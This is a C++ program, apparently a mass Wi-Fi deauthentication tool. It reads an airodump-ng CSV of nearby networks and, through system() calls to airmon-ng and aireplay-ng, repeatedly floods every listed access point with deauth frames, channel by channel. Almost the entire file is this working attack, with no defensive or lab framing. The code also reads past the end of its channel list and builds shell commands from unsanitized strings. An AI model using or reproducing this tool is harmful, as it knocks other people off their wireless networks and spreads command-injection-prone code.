#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <stdio.h>

#include <iostream>
#include <cstdlib>
#include <string>
#include <vector>
#include <tuple>
#include <fstream>
#include <sstream>

using std::cout;
using std::endl;
using std::string;
using std::vector;
using std::make_tuple;
using std::get;
using std::tuple;
using std::stoi;
using std::ifstream;
using std::getline;
using std::stringstream;
using std::system;
using std::to_string;
using std::find;

vector<string> split(const string &s, char delim);
string trim(const string& str);

int main(int argc, const char* argv[]){

    string airodump_csv, interface = "";
    int iterations = 0;

    bool toggle_flag = true;
    string option, param = "";
    for( int i = 1; i < argc; i++ ){
        if( toggle_flag ){
            toggle_flag = false;
        }else{
            option = string( argv[i-1] );
            param = string( argv[i] );
            if( option == "-i" ){
                interface = param;
            }else if( option == "-f" ){
                airodump_csv = param;
            }else if( option == "-t" ){
                iterations = stoi( param );
            }
            toggle_flag = true;
        }
    }

    struct wireless_network {
        string bssid;
        int channel;
        string essid;
    };

    vector < wireless_network > w_networks;
    vector < int > channels;

    string line;
    ifstream file;
    file.open( airodump_csv.c_str() );
    bool first = true;
    while(getline(file, line)) {
        
        if(first){
            if (line.find("BSSID") != string::npos) {
                first = false;
            }
        }else{
            if( line.find(":") == string::npos ){
                break;
            }else{
                vector<string> tokens = split( line, ',' );
                struct wireless_network network;
                network.bssid = trim( tokens[0] );
                network.channel =  stoi( trim( tokens[3] ) );
                network.essid = trim( tokens[13] );
                w_networks.push_back( network );
                bool exist = false;
                for(int x = 0; x < channels.size(); x++){
                    if( channels[ x ] == network.channel ){
                        exist = true;
                    }
                }
                if(!exist){
                    channels.push_back(network.channel);
                }
            }
        }
    }
    file.close();

    for( int i = 0; i < iterations; i++ ){
        for( int j = 0; j <= channels.size(); j++ ){
            string command = "airmon-ng start " + interface + " " + to_string( channels[j] ) + " > /dev/null" ;
            system( command.c_str() );
            command = "";
            for( int k = 0; k < w_networks.size(); k++ ){
                if( w_networks[ k ].channel ==  channels[j] ){
                    cout    
                        << "Sending DeAuth " 
                        << to_string(i+1) + "/" + to_string(iterations)
                        << " - BSSID: ["  
                        << w_networks[ k ].bssid << "] - C: " 
                        << w_networks[ k ].channel << 
                    endl;
                    command += "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface + " > /dev/null & ";
                }
            }
            command += "wait" ;
            system( command.c_str() );
        }
    }

    return 0;
}

vector<string> split(const string &s, char delim) {
  stringstream ss(s);
  string item;
  vector<std::string> elems;
  while (getline(ss, item, delim)) {
    elems.push_back(item);
  }
  return elems;
}

string trim(const string& str){
    size_t first = str.find_first_not_of(' ');
    if (string::npos == first){
        return str;
    }
    size_t last = str.find_last_not_of(' ');
    return str.substr(first, (last - first + 1));
}